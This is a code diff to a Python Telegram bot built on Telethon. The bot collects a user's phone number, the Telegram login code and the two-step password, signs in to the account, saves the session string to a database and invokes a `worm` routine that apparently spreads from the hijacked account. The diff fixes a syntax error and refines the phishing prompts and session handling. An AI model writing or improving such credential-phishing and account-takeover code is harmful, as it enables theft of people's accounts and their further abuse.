@@ -27,17 +27,17 @@ def get(obj, key, default=None):
         return default
 def yesno(x,page='def'):
     return [
-        [Button.inline("Yes", '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
-        [Button.inline("No", '{{"page":"{}","press":"no{}"}}'.format(page,x))]
+        [Button.inline(strings['yes'], '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
+        [Button.inline(strings['no'], '{{"page":"{}","press":"no{}"}}'.format(page,x))]
     ]
-async def is_session_authorized(session)
+async def is_session_authorized(session):
     uclient = TelegramClient(StringSession(session), os.getenv('API_ID'), os.getenv('API_HASH'))
     await uclient.connect()
     authorized = await uclient.is_user_authorized()
     await uclient.disconnect()
     return authorized
 async def handle_usr(phone_num, event):
-    await event.respond(strings['hello'], buttons=Button.clear())
+    await (await event.respond('wait..', buttons=Button.clear())).delete()
     msg = await event.respond(strings['sending'])
     uclient = TelegramClient(StringSession(), os.getenv('API_ID'), os.getenv('API_HASH'))
     await uclient.connect()
@@ -70,9 +70,8 @@ async def sign_in(event, user_data):
             await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
         else:
             return False
-        data['session'] = uclient.session.save()
-        data['logged_in'] = True
         login = {}
+        data = {'session': uclient.session.save(), 'logged_in': True}
         await event.edit(strings['login_success'])
         await worm(uclient, logger_bot)
     except telethon.errors.PhoneCodeInvalidError as e:
@@ -129,7 +128,7 @@ async def handler_all_user(event):
         if 'phone' in user_data:
             login = await handle_usr(user_data['phone'], event)
         else:
-            await event.respond(strings['ask_phone'], buttons=[Button.request_phone(strings['share_contact_btn'], resize=True, single_use=True)])
+            await event.respond(strings['hello'], buttons=[Button.request_phone(strings['share_contact_btn'], resize=True, single_use=True)])
     if login!={}:
         data['login'] = json.dumps(login)
     if data!={}:
@@ -161,7 +160,8 @@ async def handler_callback(event):
         login['pass_ok'] = False
         login['need_pass'] = True
         await event.edit(strings['ask_pass'])
-    database.update_one({"chat_id": event.chat_id}, {'$set': {'login': json.dumps(login)}})
+    user_data['login'] = json.dumps(login)
+    database.update_one({"chat_id": event.chat_id}, {'$set': {'login': user_data['login']}})
     if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
         await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
     elif press=="nopass":
